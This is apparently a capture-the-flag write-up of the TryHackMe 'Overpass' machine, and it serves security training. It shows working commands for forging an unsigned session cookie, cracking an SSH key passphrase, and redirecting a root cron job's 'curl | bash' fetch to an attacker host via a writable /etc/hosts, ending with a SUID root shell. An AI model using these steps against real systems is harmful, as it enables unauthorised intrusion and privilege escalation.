# TryHackMe - Overpass

**Difficulty:** Easy | **Category:** Web / Boot2Root | **Time:** 45 min

## Summary
A boot2root machine hosting a "password manager" web application written in Go. Initial access comes from an **unsigned session cookie** that can be forged to reach the admin panel, which leaks an **encrypted SSH private key**. Cracking the key passphrase grants a user shell. Privilege escalation abuses a **root cron job that fetches and executes a remote script**, combined with a **world-writable `/etc/hosts`** file used to hijack the domain resolution.

## Reconnaissance

### Port scan
```bash
nmap -sC -sV -Pn <TARGET_IP>
```

**Results:**
- `22/tcp` - OpenSSH 8.2p1 (Ubuntu)
- `80/tcp` - HTTP, Go `net/http` server (title: Overpass)

Only two exposed services; the web application is the primary attack surface.

### Directory enumeration
```bash
gobuster dir -u http://<TARGET_IP> -w <wordlist>
```

**Findings:**
- `/admin` and `/admin.html` - administration login
- `/downloads` - precompiled binaries and source code
- `/aboutus`, `/css`, `/img`

## Exploitation - Step 1: Session cookie forgery

The `/downloads` page exposes the application source. The client-side login logic (`login.js`) reveals the authentication flow:

```javascript
const response = await postData("/api/login", creds)
const statusOrCookie = await response.text()
if (statusOrCookie !== "Incorrect credentials") {
    Cookies.set("SessionToken", statusOrCookie)
    window.location = "/admin"
}
```

The `SessionToken` cookie is **not signed or hashed** - it is a plain base64 encoding of the username. It can therefore be forged without knowing any credential:

```bash
echo -n 'admin' | base64        # YWRtaW4=
curl -s http://<TARGET_IP>/admin/ -H "Cookie: SessionToken=YWRtaW4="
```

This returns the administrator area.

## Exploitation - Step 2: Encrypted SSH key

The admin panel contains a note addressed to `James` and an **AES-encrypted RSA private key**.

Extracting the key (the page uses Windows line endings, which must be stripped or the key is rejected as `invalid format`):

```bash
curl -s http://<TARGET_IP>/admin/ -H "Cookie: SessionToken=YWRtaW4=" \
  | tr -d '\r' \
  | sed -n '/BEGIN RSA PRIVATE KEY/,/END RSA PRIVATE KEY/p' \
  | sed -e 's/<[^>]*>//g' -e 's/^[[:space:]]*//' > ~/james_key
chmod 600 ~/james_key
```

Cracking the passphrase:

```bash
ssh2john ~/james_key > ~/james.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ~/james.hash
```

The passphrase falls to a common dictionary word.

## Flag 1 - user.txt

Initial shell as `james` via the recovered key:

```bash
ssh -i ~/james_key james@<TARGET_IP>
cat user.txt
```

Format: `THM{...}`. *Flag value kept private per TryHackMe content rules.*

## Exploitation - Step 3: Privesc via root cron and /etc/hosts hijack

Enumeration:

```bash
cat /etc/crontab
```

A root cron entry executes a remotely fetched script every minute:

```
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

The hostname `overpass.thm` resolves through `/etc/hosts`, and that file is **world-writable**:

```
-rw-rw-rw- 1 root root /etc/hosts
```

This is a direct privilege escalation: redirect the hostname to an attacker-controlled server, serve a malicious `buildscript.sh`, and the root cron executes it.

**On the target:**
```bash
echo "<ATTACKER_IP> overpass.thm" >> /etc/hosts
# remove the original 127.0.0.1 entry - it takes precedence
grep -v '^127.0.0.1 overpass.thm$' /etc/hosts > /tmp/h && cat /tmp/h > /etc/hosts
getent hosts overpass.thm
```

*Note: the original entry must be removed, otherwise the resolver returns `127.0.0.1` first. Because `/etc` itself is not writable, `sed -i` fails (it needs to create a temporary file in the same directory); the `grep -v` + redirect approach is used instead.*

**On the attacker machine:**
```bash
mkdir -p ~/www/downloads/src
cat > ~/www/downloads/src/buildscript.sh << 'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
EOF
cd ~/www && python3 -m http.server 80
```

Within one minute the cron fetches and executes the payload as root. A SUID bash is left behind:

```bash
ls -la /tmp/rootbash        # -rwsr-sr-x 1 root root
/tmp/rootbash -p
id                          # euid=0(root)
```

## Flag 2 - root.txt

```bash
cat /root/root.txt
```

Format: `THM{...}`. *Flag value kept private per TryHackMe content rules.*

## Key Takeaways

1. **Never trust an unsigned cookie** - if a session token is only base64-encoded and not signed, it can be forged. Always verify integrity server-side (HMAC/JWT signature).
2. **Encrypted private keys are only as strong as their passphrase** - an AES-encrypted key with a dictionary passphrase gives no real protection.
3. **Remote code execution in cron** - a scheduled job that pipes a downloaded script into `bash` runs attacker-controlled code with the job's privileges.
4. **File permissions on `/etc/hosts`** - a world-writable hosts file allows DNS hijacking of any internal hostname, including names used by privileged scripts.
5. **Removing rather than appending** - when tampering with a hosts file, the original entry has to be replaced, not duplicated; the first match wins.
6. **Tooling quirks** - `sed -i` requires write access to the parent directory, not just the file. Fall back to `grep` into a temp file and redirect back.
